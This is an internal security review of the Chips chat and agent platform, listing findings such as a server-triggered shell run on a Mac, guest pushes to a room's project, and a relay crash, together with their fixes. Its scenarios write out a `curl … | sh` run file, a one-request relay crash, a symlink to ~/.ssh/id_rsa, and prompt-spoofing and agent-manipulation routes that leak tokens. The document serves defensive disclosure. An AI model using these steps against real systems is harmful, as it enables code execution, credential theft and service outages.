# Security review of Chips, second round

Verdict: **The Mac now runs code, and the check in front of it trusts the wrong party. Any server
Chips for Mac is signed into can make that Mac run a shell command without a click, and a guest
can put code into a room's project that Run then runs on the owner's Mac. Both are small changes
to close. The rest of the new surface (the page door, the door's new events, replies, the relay's
Go direct) held up well.**

Reviewed: Chips `main` at `4117e1d5`, read on 25 October 2026 on the Mac mini.
Scope: what changed since the 17 October review's last fix landed (`90e4d403`, 18 October), about
375 commits: rooms' projects as git repositories (ADRs 0220 to 0223), Your folder, Open folder, Run
on Mac and Universe (0224 to 0227, 0230), bridges fetched from npm and the install line (0218), Chips
for Mac's login item, menu bar and page scheme (0215, 0201), the page door (0201), the relay's
`/pair` and `/join` pages (0207, 0210), Go direct and turning the relay off (0211), pairing a phone
for somebody else (0206), replies (0219), Lock changes (0199), messages for a person (0204, 0216),
Not right? (0200), hidden rooms (0205) and the member's narrowed directory (0034's addendum).
Six readers each took one surface. Every finding graded Medium or above was re-read by the lead
before it went in, and the relay crash was re-run.

Finding numbers carry on from the first review: SEC-39 onward. The first review is
`docs/reviews/security-review.md`.

## Arjun's decisions, 25 October

- SEC-39: Universe's Run and Open happen only on the Mac where the server runs, and only for an
  owner. How the rule is checked is written under SEC-39.
- SEC-42: an owner's pairing code opened through the relay's page pairs a device only after an
  Allow on the device that made the code, and that Allow shows a short code made from the new
  device's key, which must match the code the new device shows. An invite redeemed through the relay's page waits for
  the inviter's Allow too, and the Allow sheet shows a short code made from the joining device's
  key, which must match the code that device shows; nothing of the workspace is visible to the
  person until then. This reuses the join-request Allow that SEC-6 gave device joins. What stays
  is written into SECURITY.md and ADR 0207: a dishonest relay page can still send a person to
  another server dressed as this one, which only trusting the relay, or not opening invites in
  its page, prevents.
- SEC-40: a guest may read a room's project but not push to it, refused at the project door by
  either their workspace role or their room role, with the same rule for Undo; a guest has no
  harness of their own to push through (`add-harness.ts` refuses one). Members and their own
  agents keep pushing, as ADR 0220 has it. Run says who changed the files since the person last ran
  it, "changed by Dana" or "changed by Dana's agent", whenever that was anyone but the person and
  the agents of their own harnesses, and never refuses a run for it.
- Links live 30 minutes at most. Today only invites last longer: 7 days by default, up to 31,
  and Invite someone offers a day, a week or a month (`INVITE_LASTS` in `packages/core/src/people.ts`,
  `DEFAULT_INVITE_TTL_SECONDS` and `MAX_INVITE_TTL_SECONDS` in the invites use case). Both become
  30 minutes, the Lasts choice goes, and the limit is applied when a link is used as well as when
  it is made, so invites made before the change stop too. Pairing codes (15 minutes), harness join
  links (15) and join codes (10) are inside it already.
- Addition: a space shared with another person says so on its row in the Spaces tab, a person
  icon and the word "shared", so it is plain at a glance which rooms other people read and, by
  SEC-40's rule, push to. "Shared" means a person besides the reader is a member of the room,
  or an agent whose harness belongs to somebody else is, even with that person not in the room;
  the reader's own agents don't count. Rows show nothing of the kind today; core's `sharedSpaces` (in
  `packages/core/src/people.ts`) already answers the same question for the People page. The same
  goes for agents: an agent whose harness belongs to somebody else says whose it is, "Dana's
  agent", in the agent selector (the column of faces, ADR 0229) and on the space's details page.
  Today only a guest sees that line, on room details (`agentByline` from `belongsTo`, ADR 0196);
  owners, admins and members see the harness's name, and the selector says nothing. A phone-width
  mock comes before the build. Built and live 25 October (`2d7284bc`, [ADR
  0234](../decisions/0234-a-room-somebody-else-reads-says-shared-and-an-agent-says-whose.md)): his B
  in violet, a tag at the start of the row's second line, on the phone, iPad, web and Mac, and on
  the details head; "Dana's agent · Hermes" in the field's list, the column of faces and room
  details; a harness with no recorded owner counts as nobody else's.
- SEC-47: left as it is.
- ADR 0191: the four-line signature inside a tunnel is refused from the next release on, not one
  release later; a phone on a build from before 18 October is reinstalled.

## Since this review

A fix in the SDK or the protocol is live for a harness only once its bridge carries it: hermes,
opencode, acp and openclaw each bundle the SDK from their `vendor/` tarballs, and the bridges this
Mac runs come from npm. Re-vendored 25 October, 23:00 PDT, from Chips `70fbcbc5`; published by
Arjun 26 October (hermes last, 00:21 PDT), and the five this Mac runs reconnected.

| Finding | State | Commit |
| --- | --- | --- |
| SEC-39 | Fixed and live 25 October, 12:00 PDT (ADR 0231). Chips for Mac acts for a workspace only when the key its device was pinned to is the key its own loopback server answers, and only for an owner; an ask from another device for any other workspace is dropped. Run and Open in browser fetch the project from that loopback server, and the shell refuses any other address for them. The server refuses a run or open ask from anybody but an owner. The phone shows Desktop, and a browser shows Open folder in Mac and Run, to an owner alone. The shell's commands are allowed for the main window alone. Walked at 12:34: Run on Sudoku mini from Arjun's iPhone started it in the installed Chips for Mac on the Mac mini | `34b19c15`, `f81eed99`, `f577e4de`, `80cabf4f`, `354697d4` |
| SEC-41 | Fixed and live 25 October, 13:18 PDT (the hosted relay runs 0.0.0+462f3a40, where `//` through Caddy now answers 400). The relay reads a request's path through one guarded `pathOf`, for its pages and its upgrade alike, and answers 400 when a target can't be read (`//`, `///`); the relay keeps serving. | `8deec616` |
| SEC-17 | Fixed and live 25 October, 13:18 PDT (the hosted relay and 4431). chipsd, `chips serve`, `chips up`, `chips relay` and chips-relay end on a throw nobody caught or a rejection nobody handled after one fatal line, so launchd or systemd starts a clean process. The dropped promise this review named at `server/src/interfaces/ws/server.ts:127` was not one: the hub's `receive` has chained and caught each frame for its own session since 2 September (`hub.ts`), so nothing changed there. | `cb0dfe3e` |
| SEC-40 | Fixed and live 25 October, 14:23 PDT (ADR 0220's and 0226's addenda). A guest, by workspace role or room role, reads the project and is refused a push at git's first ask and at the push, and Undo reads both roles. Members and their own agents keep pushing. A run keeps the commit it started at, and the Run bar names whoever else changed the files since, "Changed by Dana since you last ran it.", and runs it all the same. Your folder shows a guest that sentence in place of Send. | `b5802fd4`, `c64c0077` |
| SEC-46 | Fixed and live 25 October, 20:20 PDT (ADR 0226's addendum). `opens` is judged by its last part once `.`, `..` and slashes settle, and again on the Mac on the file's real path before `open`; the compared command now ends `open <opens>`, so a phone on an older build can't Run a recipe with both until it is updated | `02dd5bdc` |
| SEC-48 | Fixed and live 25 October, 20:20 PDT (ADR 0087's addendum). The store refuses any unarchive that would seat a guest in a second open room, whichever path asks; a restored agent reopens a room its archive or its harness closed, not one a person archived | `33c3d4d4` |
| SEC-49 | Fixed in the SDK 25 October, 20:20 PDT (ADR 0219's addendum). Both names in a reply's quote carry their standing. Jacobian's copy live 25 October, 22:43 PDT: the reply's names, the room's lines and what a turn overhears say a person's standing. In the published bridges, which bundle the SDK, from 26 October, 00:21 PDT: hermes 1.0.3, opencode 1.0.3, acp 1.0.2 and openclaw 1.0.2, OpenClaw's own reply and room lines saying standing too; the five this Mac runs reconnected | `7d6e52ec`, Jacobian `0c48cff`, openclaw `5d519e5` |
| SEC-50 | Fixed and live 25 October, 20:20 PDT (ADR 0218's addendum). The installer's line and the card's own carry the link in `CHIPS_JOIN_LINK`, never among the words; journeys J7 and J8 pass | `150d7e9b` |
| SEC-51 | Fixed and live 25 October, 20:20 PDT (ADR 0218's addendum). Chips for Mac sends the sheet's card name, and `chips connect` refuses before any download when it isn't the local card's | `8272efa3` |
| SEC-52 | Fixed in the SDK 25 October, 20:20 PDT (ADR 0221's addendum). The bridge fetches and sends by the project's URL, `core.fsmonitor` off, and leaves a copy alone while its config holds a key besides git's own, the remote, a branch's upstream and a name for commits. Jacobian's `project.ts` does the same, live 25 October, 22:43 PDT. Every bridge on this Mac still ran `git fetch origin` with the token at 23:00 on 25 October. In the published bridges from 26 October, 00:21 PDT: hermes 1.0.3, opencode 1.0.3, acp 1.0.2 and openclaw 1.0.2; the five this Mac runs reconnected, and none of their bundles fetches `origin` | `2a83cc74`, Jacobian `9090d69`, hermes `99ea17c`, opencode `e6fe22a`, acp `2731e7a`, openclaw `8f5e3f0` |
| SEC-53 | Fixed and live 25 October, 20:20 PDT. A person holds 32 unspent page tickets at most, attachment and project pages together, and the project page wants a person with a device | `201e5a65` |
| SEC-54 | Fixed and live 25 October, 20:20 PDT (ADR 0208's addendum). A day's `servers` and `reached` hold 100,000 keys each at most, and a capped day says `at_least` | `dbd7a3c6` |
| SEC-55 | Fixed and live 25 October, 20:20 PDT (ADR 0231's addendum). Open and View take the real path of the folder and the file, and View refuses a page that is a link to a program | `1d7d3ecf` |
| SEC-29 (code) | Fixed and live 25 October, 20:20 PDT (ADR 0158's addendum). The phone shows the server's fixed words for a push it can't open, whatever it said. The other half live 26 October, 08:25 PDT: 4431 and the demo server send with an Expo access token, and Expo's Enhanced Security for push is on. Since 22:07 PDT the token is a robot user's, a Viewer, and his personal one is deleted. Checked: a push without the token is refused (403), one with it reached his phone | `a8e54f62` |
| SEC-12 | Fixed and live 25 October, 20:20 PDT (ADR 0144's addendum). A server holds 16 relay sessions at most from one address (IPv6 by its /64), the rest refused `busy`. No handshake rate: a sleeping server's phones redial every 5 s and a carrier's NAT shares addresses | `530a3560` |
| SEC-13 | Fixed and live 25 October, 20:20 PDT. Sign-in challenges are counted, five a minute from an address, and at most 10,000 are held, the oldest forgotten first | `8f5c6b78` |
| SEC-43 | Fixed and live 25 October, 18:48 PDT (ADR 0153's addendum). The take rate is one mark per 50 ms over two seconds; the bytes in flight are a running total; an ack counts no further than what was sent; a finished answer the caller is silent on for a minute is forgotten, as is the oldest past 1,024. 50,000 acks: 6.8 s before, under half a second now | `eada5814` |
| SEC-44, SEC-45 | Fixed and live 25 October (4431 18:48; web, Mac and the phone's TestFlight build 202610260150). markdown-it 15.0.3 (a 200 KB unclosed reference: 895 ms before, about 80 now) and zod 4.6.6, Astro's copy moved by an override; both in the advisories guardrail. The bridges bundled zod 4.5.4 until hermes 1.0.3, opencode 1.0.3, acp 1.0.2 and openclaw 1.0.2, published 26 October by 00:21 PDT; the five this Mac runs carry 4.6.6 | `be6b6f83` |
| SEC-20 | Fixed and live 25 October: the hosted relay runs Node 22.23.4 (18:50), Chips for Mac carries it. `.node-version` 22.23.4, what a release, Chips for Mac and the hosted relay carry; `engines` stays the floor (ADR 0001) | `126f2d7c` |
| ADR 0191 | Fixed and live 25 October, 17:57 PDT (its addendum of that day). Inside a tunnel only the five-line signature that names the tunnel is good; the four-line shape there is refused from any device, and the in-memory set of devices that had signed five goes with the warning. The plain port keeps the four-line shape for the CLI on loopback and a browser the server served | `2052f51f` |
| SEC-42 | Fixed and live 25 October (ADR 0232). An invite, or a pairing code a person's device makes, while the relay is on asks: using it makes a join request that waits for the person who sent it, alone, with six digits from the joining device's key on both screens to compare before Allow. Nothing exists for the joiner until then; an invite is spent when the allowed device collects it. Invites last 30 minutes, checked at use too, so older ones stop, and Invite someone's Lasts choice is gone. The operator's own codes still pair at once. What stays, in SECURITY.md and ADR 0207: a dishonest relay page can still send a person to another server dressed as this one | `3b6803e0`, `74819485`, `8237d3ca` |
| SEC-28 (first review) | Fixed and live 26 October, 02:07 PDT, with SEC-33 (4431; web, Mac and the iPhone's build 202610260910) (ADR 0191's addendum). Checked live: through the tailnet `/v1/health` reads `relay: { status }`, on this Mac it names the relay and the key, and `/v1/server` unsigned is 401. `GET /v1/health` names the relay and the tunnel key only to a request straight from the server's own machine (`chips doctor`, Chips for Mac, an operator); a stranger, a tunnel and a forwarded request read `relay: { status }`. A paired device reads both from `GET /v1/server`, signed. The relay's `/health` says status, name and version, and its counts only to its own box: the hosted relay runs 0.0.0+300b3104 from 26 October, 07:27 PDT (backup `chips-relay.mjs.bak-20261026-6ccc6773`), and through Caddy says no counts | |
| SEC-36 (first review), the natives | Fixed 26 October; Chips for Mac's build of 26 October, 02:09 PDT, took its natives from the lock. A release installs better-sqlite3, sharp and esbuild with `npm ci` from `tools/release/runtime/package-lock.json`, so they and everything under them come at the versions it names, each checked against its integrity; a guardrail holds the lock to the server's versions and to npm's registry, and `pnpm release:lock` writes it again. better-sqlite3 13 ships its builds inside its npm tarball, so nothing is downloaded beside it. The signature, on Arjun's word the same day (ADR 0119's addendum): `pnpm release:sign` signs `SHA256SUMS` with an Ed25519 SSH key kept on his Mac, and `install.sh` carries its public half and installs a downloaded release only when `ssh-keygen -Y verify` holds the signature to it | |
| SEC-33 | Fixed and live 26 October, 02:07 PDT (ADR 0091's addendum; 4431, the web, Chips for Mac, his iPhone's build 202610260910). Two names clash when they look the same: NFKC, nothing a reader can't see, and a Cyrillic or Greek letter that looks Latin read as that letter. A name a person types is refused with a hidden character or a word mixing Latin, Cyrillic and Greek, and says why; no agent is called Main or You (asked, it is numbered; renamed, refused); what a harness or a device calls itself loses its hidden characters. None of 4431's 247 names breaks it | `90881522` |

## The short version

| # | What | Who can do it | Fix |
| --- | --- | --- | --- |
| SEC-39 | A server sends `folder.run` and Chips for Mac runs its command in `zsh -lc`, with nothing shown on the Mac. An unpaired Mac pairs at once from any `chips://pair` link | the server behind any workspace the person opens in Chips for Mac | Arjun's rule: Universe's Run and Open happen only on the Mac where the server runs (the Mac checks, by key), and only for an owner (the server checks) |
| SEC-40 | A guest mints a project token and pushes to the room's `main`. Agents pull it, and Run runs it on the owner's Mac with no "changed" line, since Run compares only the command | an invited guest | refuse a guest's push; Run compares the commit too |
| SEC-41 | `GET //` crashes the relay process; every phone on every server it carries loses its remote path | anyone on the internet | try/catch the two URL parses; a process handler |
| SEC-42 | Pairing and invite links open a page the relay serves, and that page reads the code from the fragment | whoever runs or breaks into the relay host | send relay links only for a relay the owner runs, or confirm a link-paired device |
| SEC-43 | Each tunnel ack costs time proportional to the acks before it; ~10,000 small frames a second hold chipsd's loop at 100% | anyone holding the server's public key | a bounded ring for the pacing marks |
| SEC-44 | `markdown-it` 15.0.2 takes 18 s on a 400 KB `.md` page with an unclosed link reference | anyone who posts a file | 15.0.3 |

Eleven Lows follow (SEC-45 to SEC-55). Of the first review's open items, SEC-17 (no process
handler) is what makes SEC-41 a crash, CI (SEC-19) has not run since 10 October, and the bundled
Node (SEC-20) is unchanged.

## What changed in the attack surface

The first review's picture was a server that brokers decisions and clients that draw what it
sends. Three things moved since.

**The server can now make a Mac act.** Open folder and Run (ADRs 0225, 0226) send `folder.open`
and `folder.run` frames over the socket to the person's Chips for Mac, which opens Finder, checks
out the room's project and runs its run file in a login shell. Before this, a hostile server could
show a person words; now it can run a program on their machine if the client believes it.

**A room's project is code that people and agents both write.** Agents pull it before every turn
and work on it; Run executes it. Whoever may push is, in effect, whoever may run code in the
agents' copies and on the Mac of whoever presses Run.

**The relay serves pages.** Until ADR 0207 the relay carried ciphertext and control frames only.
It now serves the HTML and script that read pairing codes and invite tokens out of a link's
fragment, so an honest relay is part of what keeps those secrets.

## Findings, ranked

Confidence: *verified* means the lead re-read the whole path or re-ran the probe; *reviewer*
means the surface's reader confirmed it by reading or by probe and the lead read the summary;
*suspected* means read but not run where it matters (a device, a load).

### Critical

**SEC-39 · Any server Chips for Mac is signed into can run a command on that Mac, with no click** ·
verified

Where: Chips for Mac's store asks its server for `folders` frames (`packages/core/src/transport.ts:389`
to `:403`, set up through `createFolders` in `apps/web/src/app/Shell.tsx:211`). `heard()` in
`apps/web/src/app/folders.ts:230` takes a `folder.run` frame's `command` and calls
`run(room, "run", {command})`. The only conditions are that the room is in the model, which the
server controls, and that the Mac can run here. No card is shown and nothing has to be pressed.
`once()` (`:124`) asks the same server for a project token and invokes `project_folder`. The CLI's
`withProject` (`cli/src/commands/folder.ts:265`) fetches and checks out that server's project.
`runIn` (`:316`) refuses only when `shown !== commandOf(recipe)` (`:326`). The server wrote both
the command it says the person was shown and the run file it is compared with. `startRun` spawns
`/bin/zsh -lc <command>` in the folder (`cli/src/commands/run.ts:291`).

A second door reaches a Mac app that isn't paired yet. A `chips://pair?pair=<code>&lan=https://…`
link from any web page, opened through the browser's "Open Chips?" prompt, is taken by
`Pairing.tsx:257` and paired at once (`:944`). The confirmation SEC-8 added is the phone's.

Scenario: Priya invites Arjun to her workspace and he opens it in Chips for Mac. Her server,
changed by her, sends `folder.run` for a room he is in. The room's project carries
`.chips/run.json` with `{"run": "curl -s https://… | sh"}`, and the frame's `command` repeats it.
The Mac fetches the project, compares two strings Priya wrote, and runs the line as Arjun. The
existing test "runs and stops when the phone asks" in `folders.test.tsx` drives exactly this path
from a socket frame. Whoever takes over a server gets the Macs of everyone who uses Chips for Mac
with it.

Why the check doesn't hold: ADR 0226 means the person's press on their phone as the consent, and
on the person's own server it is. But the Mac learns of that press only from the server, so the
consent is as good as the server. The threat model already names "a server … if it is not the
owner's" as an attacker; the Mac app now has the most power of the three clients and the least
checking.

Fix, Arjun's rule (25 October): Universe's Run and Open happen only on the Mac where the server
runs, and only for an owner. The two halves are checked in different places, because they stop
different attackers.

- The Mac checks that the server is its own. Chips for Mac runs or opens a project, whether the
  ask comes from the phone, a browser or its own Desktop tab, only when the workspace's server is
  the one running on this Mac. It tells by key, not address: the key the device is pinned to
  must equal the key of the server `here::serving` finds in this Mac's home, which a hostile
  server cannot show without that server's private key. For any other workspace the Mac offers no
  Run or Open, and ignores `folder.run` and `folder.open` from its server. A rule kept by the server
  alone would be no defence here, since the attacker is the server.
- The server checks that the person is an owner. It refuses a run or open ask from anyone else,
  and the apps hide Universe → Desktop for them.

This closes both ways in: a Mac paired through a `chips://pair` link to somebody else's server has
nothing to run for it. A confirmation before a link pairs is still worth adding, but the fix no
longer rests on it. What the rule gives up: Run and Open from an owner's second Mac, from a second
owner on their own Mac, and for members and admins. Other servers on the same Mac (the demo on
4460, test servers on other ports) are not this Mac's server either. Your folder's copy and
Download as zip run nothing and are outside the rule. Structural point, kept: anything that
executes needs consent on the device that executes it, and a server's statement that the person
saw something proves nothing to a client that cannot check it.

### High

**SEC-40 · A guest pushes to the room's project, and Run runs the guest's code on the owner's Mac
without a warning** · verified

Where: `server/src/application/use-cases/project-door.ts:140`, `admitPerson`, admits any person in
the room, and serves both fetch and `git-receive-pack` to them. `POST /v1/spaces/:id/project/token`
(`server/src/interfaces/http/routes/project.ts`, `registerProjectTokenRoutes`) mints a token for
whoever `admit` lets in. Undo is the project's other write, and it refuses a guest (`undoRefused`,
`:58`). ADR 0222 says "A guest reads what the room shows them and may not Undo." `undoRefused` reads
only the workspace role, so a member who is a guest in that room may both push and Undo; every
other guest check reads both roles (`set-lock.ts:41`).

Run's consent covers the command line, not the files it runs. "Changed since you last ran it"
compares `run.command` with `commandOf(recipe)` (`packages/core/src/projectRun.ts:206`). The Mac's
guard compares the same two strings (`cli/src/commands/folder.ts:326`).

Scenario: a guest in a room with a project mints a token, clones, edits `app.py` and pushes to
`main`. The hook checks refs, sizes and key shapes and takes it, recording a `project.changed`
under the guest's name. Every agent's bridge rebases it into the agent's copy before its next turn.
The owner ran `python3 app.py` yesterday and presses Run in Universe today. The command is the
same, so there is no amber line, and the guest's code runs as the owner on the Mac. An agent that
runs tests in its copy runs it too, and to the approval gate that is an ordinary turn.

Fix: refuse `git-receive-pack`, and the token route's push use, when the person's workspace role
or room role is `guest`, and use the same two-role rule in `undoRefused`. Decide in ADR 0220
whether a member may push; it says any person in the room may. Then make Run's consent cover what
runs: keep the commit last run beside the command, and say "Changed since you last ran it" when
the files changed, naming who changed them when it was anyone but the room's agents. ADR 0226's
consequence, "Run trusts what the agents wrote as much as running it in Terminal would", is true
only once nobody else can write.

**SEC-41 · One request crashes the relay** · verified

Where: `relay/src/join-page.ts:111`, `relayPage`, calls `new URL(rawUrl, "http://relay.local")`
outside any `try`, from the HTTP handler at `relay/src/server.ts:190`. `new URL("//", base)` throws
`ERR_INVALID_URL`, and the relay has no `uncaughtException` handler. The upgrade handler has the
same unguarded parse (`server.ts:247`); it predates the first review and the first review didn't
name it. The new page route lets a plain GET reach the same throw.

Scenario: `curl --path-as-is https://<relay>//`. The process exits. Every phone of every server on
that relay loses its way in until the service manager restarts it, and a loop keeps it down. The
reader reproduced the exit on a relay started from source on 127.0.0.1. Whether Caddy in front of
the hosted relay passes `//` through was not checked.

Fix: wrap both parses and answer 400 (one guarded "path of this request" helper for both
handlers), and add the process-level handlers the first review asked for in SEC-17, in the relay
and in chipsd.

**SEC-42 · The relay serves the page that reads pairing codes and invite tokens** · verified

Where: with a relay configured, `codeOnTheWire` hands out `pairRelayUrl(...)`
(`server/src/interfaces/http/routes/pairing-codes.ts:113`), and invites hand out
`inviteRelayUrl(...)` (`server/src/interfaces/http/routes/invites.ts:242`). Both are
`https://<relay>/pair#pair=<code>&…` and `/join#…`. The fragment never travels in a request, but
the script that reads it is the relay's own (`relay/src/pair-page.ts`, `join-page.ts`,
`page-parts.ts`, with a CSP the relay sets for itself). ADR 0210 says "The relay never sees it: it
rides in the fragment", which holds only while the relay serves honest bytes.

Who: whoever runs the relay host, its TLS front, or breaks into either. For the hosted relay that
is one machine serving every workspace that uses it.

Scenario: Arjun presses You → Pair a computer. The link opens in a browser; the iPhone app doesn't
claim `/pair`, on purpose. A changed page reads `location.hash` and sends the code home. The
operator already holds the server's public key, opens a tunnel and calls `POST /v1/pair`, which is
open through the tunnel, with a key of their own. They now hold a device signed in as the owner,
and the real computer's attempt fails as an unknown code. An invite goes the same way through the
redeem route. On the iPhone the relay also serves the `apple-app-site-association` file that
decides whether the app claims `/join` at all.

Fix: this one is Arjun's call between two shapes. Smallest: send the relay's page only when
configuration says the relay is the owner's own, and otherwise the server's own page or the
`chips://` link, as before ADR 0207 and 0210. Structural: a code in a link stops being a bearer
credential by itself. A device paired by link waits until the device that made the code allows it
("A Mac called Studio is asking to pair. Allow?"). The issuing sheet can do this, since it already
polls `/v1/devices` while it is open, and invites can work the same way. If the hosted relay's
operator is to be trusted instead, SECURITY.md and ADR 0210 should say so plainly.

### Medium

**SEC-43 · Acks in the tunnel get dearer the more there are** · reviewer, probe

Where: `packages/tunnel/src/mux.ts:366` to `:371`. `mark()` rebuilds `marks` with a filter and a
spread on every ack that raises a paced answer's count, and keeps every mark from the last two
seconds. `took()` calls it for any id still in `sent` (`:1002`). Once a caller has sent a `window`
frame, every answer is counted, the tunnel's own 429 refusals included, and a stranger can draw
those without limit. Their entries stay in `sent` until every byte is acked.

Scenario: a stranger with the server's public key, from any QR, invite link or health answer,
opens one tunnel at the relay or the LAN door. They send `window`, draw refusals, then stream small
acks. The reader measured about 12 µs for a frame that does nothing, against 44 µs per ack at
5,000 marks and 118 µs at 20,000. About 10,000 small frames a second, 1 to 2 MB/s up, holds the
server's one event loop at 100%.

Fix: keep `marks` as a bounded ring (32 entries, or one per 50 ms) and drop old ones with `shift`;
ignore acks for answers that have ended; drop a finished answer's count after a timeout.

**SEC-44 · `markdown-it` 15.0.2 is quadratic on an unclosed link reference** · verified (version and advisory)

Where: `packages/core/package.json` pins `markdown-it` 15.0.2, which draws `.md` pages on the web,
the Mac and the phone. GHSA-gfr2-rv44-r23c: a link reference definition whose label or title
never closes is O(n²) with default options. 200 KB takes 3.6 s, 400 KB 18 s, 800 KB 74 s on Node;
Hermes is slower.

Scenario: an agent or a guest attaches a 500 KB `.md` to a room, and whoever opens it has a frozen
app. This is the class of SEC-3 again, in the page renderer instead of the bubble tokenizer.

Fix: 15.0.3. Add the advisory's input to the timing test SEC-3 added, and add `markdown-it` to the
lockfile guardrail SEC-18 added.

### Low

- **SEC-45 · `zod` 4.5.4 keeps one issue per bad array element** · verified (version).
  GHSA-mrhx-c7xc-m3w5: an array schema with no length limit collects an issue for every failing
  element with no cap. The protocol and platform packages validate every event with it, and a
  signed body may be 4 MiB, so a guest can make chipsd allocate millions of issue objects in one
  request. Not measured. Bump to 4.6.6 and add it to the lockfile guardrail.
- **SEC-46 · A run file's `opens` can name a program with a trailing `/.`** · verified.
  `PROGRAM` ends in `\/?$` (`packages/protocol/src/project.ts:234`), so `payload.command/.` passes;
  `opensOnTheMac` (`:238`) takes it; `commandOf` (`:225`) leaves `opens` out of the string the
  person approves and the Mac compares. On the Mac, `openWhenReady` (`cli/src/commands/run.ts:456`)
  resolves it to `<folder>/payload.command` and `/usr/bin/open` runs it. The person approves a
  harmless `run`, and the program runs beside it. Since `run` is trusted code anyway (SEC-40), this
  is a control that doesn't hold rather than new power. Test the pattern on
  `basename(resolve("/", opens))`, test it again on the Mac before `open`, and put `opens` into
  `commandOf`.
- **SEC-47 · On the iPhone a page's script can open a web address outside the app** · suspected.
  `pageLoad` (`apps/mobile/src/spaces/page.ts`) trusts `navigationType === "click"` as a tap.
  WebKit reports a script's `a.click()` as a link activation, so `PageView.tsx:83` hands an address
  the page chose, with whatever it puts in the query, to `Linking.openURL`. The page reaches only
  http(s) and mailto, and still can't fetch or probe the LAN. Read in the code and in WebKit's
  source, not run on a device. SEC-7's row says iOS can tell a tap from a page leaving by itself;
  this says it can't. Open outside only from a sheet that names the host.
- **SEC-48 · Restoring an agent reopens an archived room around the guest rule** · reviewer, probe.
  `agentRestored` (`server/src/application/use-cases/one-room.ts:354`) appends `space.updated open`
  straight to the store, past `refuseReopening` and `guestsElsewhereOf` in `submit-event.ts`, and it
  reopens rooms a person archived as well as rooms the agent's archive closed. A harness that
  archives and restores its own agent puts a guest back in two open rooms (JR-24). Run the same
  check there and reopen only rooms the agent's archive closed. Structurally, put "a guest is in one
  open room" into the store's in-transaction gate beside `agentGate` and `membershipGate`.
- **SEC-49 · A reply's quote leaves out the quoted author's standing** · reviewer, probe.
  `renderReplyingTo` (`packages/protocol/src/context.ts:542` to `:553`) writes "Priya's message"
  and "Arjun is replying" without `withRole`, so a guest's words quoted in a reply reach the model
  with no "(guest)", which SEC-15 put on every other line. With names still free (SEC-33), a guest
  named "Arjun (owner)" reads as the owner there. Use `withRole` for both, and change Jacobian's
  copy of these words to match.
- **SEC-50 · The pasted install line puts the join link on argv** · reviewer.
  `packages/core/src/connect.ts:183` builds `curl … | sh -s -- connect <id> '<link>'`. `install.sh`
  holds the link in `sh`'s argv through the download, then `exec`s `chips connect "$@"`, so other
  users on that machine can read it with `ps` or `/proc/*/cmdline`, and whoever redeems first gets
  the harness credential. ADR 0218 says the link never goes on a command line; that holds only for
  Chips for Mac, which passes `CHIPS_JOIN_LINK`. Use `curl … | CHIPS_JOIN_LINK='<link>' sh -s --
  connect <id>`, and `CHIPS_JOIN_LINK='<link>' chips connect <id>` on the card; both readers of the
  variable already exist.
- **SEC-51 · The Connect sheet shows the server's card, and the CLI runs the local card of that id**
  · reviewer. `connect_here` passes only `card.id`; the sheet's name and words come from the
  server's `/v1/connectors`. A hostile server can label `claude-code` "Calendar helper", and the
  person connects their local Claude Code bridge to that workspace. Draw the sheet from the local
  cards, or refuse when the names differ.
- **SEC-52 · The bridge sends its harness token to whatever `origin` the agent's copy names** ·
  verified. `packages/sdk-ts/src/project.ts:653` puts `Authorization: Bearer <harness token>` in
  `http.extraHeader` and runs `git fetch origin` (`:266`) in the agent's copy, whose `.git/config`
  the agent can write. An agent talked into it sets `remote.origin.url` to its own server, or
  `core.fsmonitor` to a program, and the next pull hands over a token good for every agent of that
  harness. The agent runs as the same user, so this is a shortcut, not new power, but the module's
  comment that "an agent that runs git push itself has neither" is not true. Fetch and push to
  `this.remote` by URL rather than `origin`, override `core.fsmonitor` in the config pairs, and
  refuse to run when the copy's config holds keys outside a short list.
- **SEC-53 · Project page tickets each hold a built document, and a harness may mint them** ·
  reviewer. `POST /v1/spaces/:id/project/page` builds with parse5 and esbuild and keeps the whole
  HTML in the ticket for 30 s, with no count per caller; unlike the attachment page route
  (`pages.ts:57`), a harness token passes. Require a person and a device, cap unspent tickets per
  principal, or keep only `{space, path, at}` in the ticket and build when it is spent.
- **SEC-54 · The relay's day tally keeps every server key it sees** · reviewer. `relay/src/tally.ts`
  keeps the `servers` and `reached` sets for up to a day, fed from every key a stranger proves and
  drops. An open relay only; the hosted relay has an allow list (ADR 0144). Cap the set and say "at
  least N", or count with a fixed-size sketch.
- **SEC-55 · Open and View follow a symlink out of the folder** · reviewer.
  `openIn` and `viewIn` (`cli/src/commands/folder.ts:339`, `:363`) check `resolve(folder, file)` by
  prefix, which doesn't resolve links. A committed symlink `notes.html → ~/.ssh/id_rsa` opens the
  target in the person's editor or browser when they press Open on it. The file goes to the person,
  not the attacker, and needs a press. `realpath` both and check again.

### Info

- **Chips for Mac's page frames are kept from IPC by three accidents, not by configuration.**
  Tauri counts `chips-page://` as a local origin because the app registers the scheme, and the 12
  app commands have no capability list. What keeps a page frame away from `project_folder` and
  `run_here` is that the invoke key goes to the main frame only, that no new-window handler exists,
  and that the frame's sandbox has no top navigation. A later frame, popup or navigation handler
  would hand a page every command. A capability that names the main window and its origin would
  make the boundary hold by itself.
- **A bridge's version floats** to the newest release of its major, checked against the registry's
  own SHA-512. ADR 0218 accepts this and leans on npm two-factor sign-in; a hostile publish to
  `@chipschat/*` runs at the next `chips connect` or `--update`. npm provenance, or a version
  pinned in each card at release time, would narrow it.
- **Presence frames** still tell every person who isn't a guest whether each harness is online,
  including members who since ADR 0034's addendum see only their rooms' agents.
- **A message's words keep raw newlines in `promptFor`**, so one message can carry a second
  "Name (owner):" line. This predates the window. Quoting each message's lines, or prefixing
  continuation lines, would close it.
- **`feedback.from` carries the room role but not `workspace_role`**, and since ADR 0200 every
  bridge starts a run on a correction. The bridges live outside the repository and weren't read.

## Still open from the 17 October review

| Finding | As of 25 October |
| --- | --- |
| SEC-17 | Still no `uncaughtException` or `unhandledRejection` handler in chipsd or the relay, and `ws.on("message", (data) => session.receive(...))` still drops the promise (`server/src/interfaces/ws/server.ts:127`). SEC-41 is this happening. |
| SEC-19 | Left as it is, on Arjun's word, 26 October: he doesn't use GitHub Actions. `pnpm check` and the e2e suites run on the Mac before anything lands. |
| SEC-20 | `.node-version` still pins 22.22.2, on the hosted relay too. |
| SEC-12 | The relay still allows 32 sessions per server with no cap per address. |
| SEC-13 | Passkey challenges are pruned when they expire but still not counted or capped. |
| SEC-16 | Left as it is, on Arjun's word, 26 October: the scrubbed commits hold only dummy harness data, and the dev-mode token in them is dead. No prune. |
